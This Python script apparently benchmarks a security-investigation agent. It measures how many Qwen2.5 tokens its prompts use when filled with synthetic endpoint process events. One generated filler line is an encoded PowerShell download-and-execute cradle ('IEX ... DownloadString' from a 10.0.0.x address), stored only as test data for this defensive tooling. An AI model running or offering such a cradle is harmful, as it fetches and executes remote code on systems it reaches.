"""Measure real Qwen2.5 token counts of prompts produced by the v0.2.0 context budget."""
import base64, json, os, random, sys
from datetime import timedelta
root = sys.argv[1]; sys.path.insert(0, root); sys.path.insert(0, root + "/tests")
from tokenizers import Tokenizer
from test_review_regressions import ListBackend, doc, settings, T0, PS
from investigator.agent import InvestigationAgent, build_agent
from investigator.evidence import EvidenceStore
from investigator.llm.mock import MockInvestigatorModel
from investigator.models import InvestigationTrace
from investigator.tools import ToolContext

tok = Tokenizer.from_file(sys.argv[2])
S = settings()
limit_tokens = S.ollama_num_ctx - S.ollama_num_predict  # room left for the prompt

def ntok(messages):
    # Qwen chat template overhead (~<|im_start|>role\n ... <|im_end|>\n) is ~5 tokens/message.
    return sum(len(tok.encode(m["content"]).ids) + 5 for m in messages) + 3

def measure(label, ctx, agent):
    tr = InvestigationTrace(investigation_id="x", model="m", backend="fixture", max_steps=12)
    for phase, instr in (("decide", __import__("investigator.agent", fromlist=["x"]).DECIDE_INSTRUCTIONS),
                         ("final_report", __import__("investigator.agent", fromlist=["x"]).REPORT_INSTRUCTIONS)):
        msgs, meta = agent._messages(ctx, tr, 1, phase, instr, lambda *a: None)
        chars = sum(len(m["content"]) for m in msgs)
        t = ntok(msgs)
        print(f"{label:<44} {phase:<12} chars={chars:>7,} tokens={t:>6,} chars/token={chars/t:4.2f} "
              f"level={meta['level']} omitted={meta['evidence_omitted']:>3}  "
              f"prompt+num_predict={t + S.ollama_num_predict:>6,} / num_ctx {S.ollama_num_ctx:,} "
              f"{'OVERFLOW' if t > limit_tokens else 'ok'}")

def filled(cmd_fn, n=150, label=""):
    docs = [doc(f"B{i}", T0 + timedelta(seconds=i), "BIG-1", 1, {
        "image": PS, "commandLine": cmd_fn(i), "processGuid": "{%08x-%04x-%04x-%04x-%012x}" % tuple(random.getrandbits(b) for b in (32,16,16,16,48)),
        "parentImage": r"C:\Windows\explorer.exe", "user": r"CORP\user%d" % i}) for i in range(n)]
    be = ListBackend(docs, "B0")
    ctx = ToolContext(be, EvidenceStore("fixture", 150), be.alert, S)
    for d in docs:
        ctx.store.add(be.events[d["id"]], "t")
    measure(label, ctx, InvestigationAgent(be, MockInvestigatorModel(), S))

random.seed(1)
filled(lambda i: "cmd.exe /c " + "x" * 900, label="R3 repro filler ('x'*900)")
filled(lambda i: "powershell -NoP -EncodedCommand " + base64.b64encode(os.urandom(700)).decode(),
       label="base64 -EncodedCommand (random bytes)")
filled(lambda i: "powershell -NoP -EncodedCommand " + base64.b64encode(
       ("IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.%d/a.ps1'); " % i * 8).encode("utf-16-le")).decode()[:960],
       label="base64 -EncodedCommand (UTF-16LE script)")
filled(lambda i: "rundll32 " + "".join(random.choice("0123456789abcdef") for _ in range(900)),
       label="hex blob command lines")

# Real pipeline: capture every exchange for the demo and benchmark suites with the mock model.
from investigator.backends.fixture import FixtureBackend
worst = (0, None)
for cases in (root + "/investigator/cases", root + "/investigator/benchmarks/independent"):
    be = FixtureBackend(cases)
    ag = InvestigationAgent(be, MockInvestigatorModel(), S)
    for a in be.list_alerts():
        r = ag.investigate(a)
        for x in r.trace.llm_exchanges:
            t = ntok(x.messages)
            worst = max(worst, (t, f"{a.alert_id} {x.purpose} chars={x.prompt_chars:,} ratio={x.prompt_chars/t:.2f}"))
print("largest real fixture/benchmark prompt:", worst[0], "tokens;", worst[1])
